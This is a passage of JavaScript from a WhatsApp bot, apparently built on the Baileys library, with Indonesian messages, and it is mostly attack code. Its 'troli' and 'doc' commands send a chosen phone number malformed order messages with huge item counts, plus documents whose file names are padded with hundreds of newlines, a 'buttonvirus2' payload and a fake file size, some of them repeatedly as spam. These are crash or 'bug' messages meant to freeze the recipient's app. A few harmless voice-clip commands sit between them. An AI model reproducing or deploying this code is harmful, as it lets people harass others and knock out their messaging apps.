"orderTitle": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"sellerJid": "6281511480762@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",			
}
}), { userJid: num, quoted: virusnya })
conn.relayMessage(num, order.message, { messageId: order.key.id })
mentions(`*Sukses Mengirim BugTroli2*
*ID:* @${num.split("@")[0]}
*Type:* Katalog`, [num])
}
break
case 'troli3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var order = generateWAMessageFromContent(num, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",						
"itemCount": 88888888888,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"jpegThumbnail": mekih,
"orderTitle": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"sellerJid": "6281511480762@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",			
}
}), { userJid: num, quoted: virusnya })
conn.relayMessage(num, order.message, { messageId: order.key.id })
mentions(`*Sukses Mengirim BugTroli3*
*ID:* @${num.split("@")[0]}
*Type:* Katalog`, [num])
}
break
case 'troli4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
var order = generateWAMessageFromContent(num, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",						
"itemCount": 77777777777,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"jpegThumbnail": mekih,
"orderTitle": `© 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩${ngazap(prefix)}`,
"sellerJid": "6281511480762@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",			
}
}), { userJid: num, quoted: virusnya })
conn.relayMessage(num, order.message, { messageId: order.key.id })
mentions(`*Sukses Mengirim BugTroli4*
*ID:* @${num.split("@")[0]}
*Type:* Katalog`, [num])
}
break

case 'hu':{
if (isGroup) return reply(mess.OnlyPM)
var mem = fs.readFileSync('./options/sound/tes.mp3')
conn.sendMessage(from, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
}
break
case 'hi':{
if (isGroup) return reply(mess.OnlyPM)
var mom = fs.readFileSync('./options/sound/ketawa.mp3')
conn.sendMessage(from, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
break
case 'ha':{
if (isGroup) return reply(mess.OnlyPM)
var mim = fs.readFileSync('./options/sound/ketawa.mp3')
 conn.sendMessage(from, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'he':{
if (isGroup) return reply(mess.OnlyPM)
var mum = fs.readFileSync('./options/sound/awkwk.mp3')
 conn.sendMessage(from, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'ba':{
if (isGroup) return reply(mess.OnlyPM)
var ah = fs.readFileSync('./options/sound/bang.mp3')
 conn.sendMessage(from, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'be':{
if (isGroup) return reply(mess.OnlyPM)
var eh = fs.readFileSync('./options/sound/nob.mp3')
 conn.sendMessage(from, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'bu':{
if (isGroup) return reply(mess.OnlyPM)
var ih = fs.readFileSync('./options/sound/ikehcok.mp3')
 conn.sendMessage(from, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'bi':{
if (isGroup) return reply(mess.OnlyPM)
var nyong = fs.readFileSync('./options/sound/mastah.mp3')
 conn.sendMessage(from, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'ca':{
if (isGroup) return reply(mess.OnlyPM)
var ri = fs.readFileSync('./options/sound/ikehcok.mp3')
 conn.sendMessage(from, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'ci':{
if (isGroup) return reply(mess.OnlyPM)
var ru = fs.readFileSync('./options/sound/loli.mp3')
 conn.sendMessage(from, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'cu':{
if (isGroup) return reply(mess.OnlyPM)
var re = fs.readFileSync('./options/sound/kesel.mp3')
 conn.sendMessage(from, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break
case 'co':{
if (isGroup) return reply(mess.OnlyPM)
var ro = fs.readFileSync('./options/sound/ngeselin.mp3')
 conn.sendMessage(from, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:virusnya})
 }
 break

case 'doc1':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
mentions(`Sukses Send ${prefix+command} To @${num.split('@')[0]}, Jumlah Spam : 1`, [num])
}
break
case 'doc2':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
mentions(`Sukses Send ${prefix+command} To @${num.split('@')[0]}, Jumlah Spam : 2`, [num])
}
break
case 'doc3':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
mentions(`Sukses Send ${prefix+command} To @${num.split('@')[0]}, Jumlah Spam : 3`, [num])
}
break
case 'doc4':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!q) return reply(`*Syntax Error!*\nEx: ${prefix+command} 628xxxx`)
var num = q+'@s.whatsapp.net'
var dev = '6285173226065@s.whatsapp.net'
if (num == sender) return reply('Itu Nomor Lu Sendiri')
if (num == dev) return reply('Lah itu kan developer botnya?')
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
conn.sendMessage(num, { document: fs.readFileSync('./options/image/mods.jpg'), fileName: `🔥 𝙁𝙖𝙡𝙡𝙂𝙣𝙕-𝘽𝙤𝙩 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: `application/txt`, jpegThumbnail: ppnyauser, fileLength: "999999999", mentions:[sender] }, {quoted:gifes})
await sleep(3000)
